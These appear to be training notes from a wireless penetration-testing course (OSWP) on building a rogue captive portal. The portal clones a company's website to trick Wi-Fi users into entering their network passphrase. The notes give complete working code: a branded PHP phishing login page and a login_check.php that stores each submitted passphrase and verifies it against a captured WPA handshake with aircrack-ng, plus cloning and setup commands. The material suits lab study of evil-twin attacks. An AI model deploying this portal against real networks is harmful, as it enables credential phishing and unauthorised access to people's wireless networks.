  In this scenario, our target does not have an existing captive portal, so our next step will be to create one that appears to be authentic. In order to avoid suspicion, we'll want to use branding and images that will be recognizable and familiar to users. We'll also use PHP scripts to save credentials that a user enters, and then we'll redirect the user to a success or failure page.

To install Apache and PHP, we'll useÂ aptÂ as follows:

```bash
kali@kali:~$ sudo apt install apache2 libapache2-mod-php
...
```

Since we are targeting an encrypted network instead of an existing captive portal, we will be creating the portal from scratch, using their website `(https://www.megacorpone.com/)` as a base for the design.

![[Pasted image 20250416155246.png]]

Let's download the index page, along with all its resources, usingÂ wget. We will be using recursive mode withÂ -r, and two levels deep, withÂ -l2, as the background picture is referenced in a CSS, which is itself referenced in the index page.

```bash
wget -r -l2 https://www.megacorpone.com
```

Although wget downloads files in the current directory, in this case, it created a directory named after the domain we are recursively downloading resources from,Â www.megacorpone.com.

Let's create our captive portal login page, calledÂ `index.php`Â inÂ `/var/www/html/portal`. Our design will be relatively simple. We will use the top line with the name of the company, followed by the background image, and a password field. We'll also include a "Connect" button.

```html
<!DOCTYPE html>
<html lang="en">

	<head>
		<link href="assets/css/style.css" rel="stylesheet">
		<title>MegaCorp One - Nanotechnology Is the Future</title>
	</head>
	<body style="background-color:#000000;">
		<div class="navbar navbar-default navbar-fixed-top" role="navigation">
			<div class="container">
				<div class="navbar-header">
					<a class="navbar-brand" style="font-family: 'Raleway', sans-serif;font-weight: 900;" href="index.php">MegaCorp One</a>
				</div>
			</div>
		</div>

		<div id="headerwrap" class="old-bd">
			<div class="row centered">
				<div class="col-lg-8 col-lg-offset-2">
					<?php
						if (isset($_GET["success"])) {
							echo '<h3>Login successful</h3>';
							echo '<h3>You may close this page</h3>';
						} else {
							if (isset($_GET["failure"])) {
								echo '<h3>Invalid network key, try again</h3><br/><br/>';
							}
					?>
				<h3>Enter network key</h3><br/><br/>
				<form action="login_check.php" method="post">
					<input type="password" id="passphrase" name="passphrase"><br/><br/>
					<input type="submit" value="Connect"/>
				</form>
				<?php
						}
				?>
				</div>

				<div class="col-lg-4 col-lg-offset-4 himg ">
					<i class="fa fa-cog" aria-hidden="true"></i>
				</div>
			</div>
		</div>

	</body>
</html>
```


In addition to being a login page, the PHP code will also indicate if the credentials are successful or incorrect. The latter will add a message above the credentials text box to indicate failure. The former will hide the text box.

We will also need to copy two directories,Â `assets`Â andÂ `old-site`, intoÂ `/var/www/html/portal`Â since they contain the `CSS` and the background image.

```bash
â”Œâ”€â”€(rootðŸ’€gobots)-[16Apr2025 20:00:52]-[/home/kali/SUT/OSWP/www.megacorpone.com]
â””â”€# cp -r assets /var/www/html/portal/
                                                       
â”Œâ”€â”€(rootðŸ’€gobots)-[16Apr2025 20:00:59]-[/home/kali/SUT/OSWP/www.megacorpone.com]
â””â”€# cp -r old-site /var/www/html/portal/ 
```

The login page form goes toÂ `login_check.php`, which we will use to verify the credentials by cracking the handshake.

```php
<?php
# Path of the handshake PCAP
$handshake_path = '/home/kali/discovery-01.cap';
# ESSID
$essid = 'MegaCorp One Lab';
# Path where a successful passphrase will be written
# Apache2's user must have write permissions
# For anything under /tmp, it's actually under a subdirectory
#  in /tmp due to Systemd PrivateTmp feature:
#  /tmp/systemd-private-$(uuid)-${service_name}-${hash}/$success_path
# See https://www.freedesktop.org/software/systemd/man/systemd.exec.html
$success_path = '/tmp/passphrase.txt';
# Passphrase entered by the user
$passphrase = $_POST['passphrase'];

# Make sure passphrase exists and
# is within passphrase lenght limits (8-63 chars)
if (!isset($_POST['passphrase']) || strlen($passphrase) < 8 || strlen($passphrase) > 63) {
  header('Location: index.php?failure');
  die();
}

# Check if the correct passphrase has been found already ...
$correct_pass = file_get_contents($success_path);
if ($correct_pass !== FALSE) {

  # .. and if it matches the current one,
  # then redirect the client accordingly
  if ($correct_pass == $passphrase) {
    header('Location: index.php?success');
  } else {
    header('Location: index.php?failure');
  }
  die();
}

# Add passphrase to wordlist ...
$wordlist_path = tempnam('/tmp', 'wordlist');
$wordlist_file = fopen($wordlist_path, "w");
fwrite($wordlist_file, $passphrase);
fclose($wordlist_file);

# ... then crack the PCAP with it to see if it matches
# If ESSID contains single quotes, they need escaping
exec("aircrack-ng -e '". str_replace('\'', '\\\'', $essid) ."'" .
" -w " . $wordlist_path . " " . $handshake_path, $output, $retval);

$key_found = FALSE;
# If the exit value is 0, aircrack-ng successfully ran
# We'll now have to inspect output and search for
# "KEY FOUND" to confirm the passphrase was correct
if ($retval == 0) {
	foreach($output as $line) {
		if (strpos($line, "KEY FOUND") !== FALSE) {
			$key_found = TRUE;
			break;
		}
	}
}

if ($key_found) {

  # Save the passphrase and redirect the user to the success page
  @rename($wordlist_path, $success_path);

  header('Location: index.php?success');
} else {
  # Delete temporary file and redirect user back to login page
  @unlink($wordlist_file);

  header('Location: index.php?failure');
}
?>
```

Although our login check script may look intimidating at first, it is rather simple. 

First it checks whether the supplied password has already been stored as a valid password inÂ `/tmp/passphrase.txt=`. If that is the case, we simply return a `SUCCESS` value to the login page. If the password is not found in that file, we write it to a wordlist file, which is then passed to the `aircrack-ng` command along with our previously captured handshake file. We then run this command and parse its output to determine if the provided password is valid or not.

As an alternative to using an existing handshake, we can also use a second wireless card withÂ _wpa_supplicant_Â to connect to the real AP. We would then use this to verify the credentials instead of cracking the handshake. If both target SSID and our rogue SSID match, we need to blacklist our BSSID in wpa_supplicant using "bssid_blacklist" so it doesn't try to connect back to us.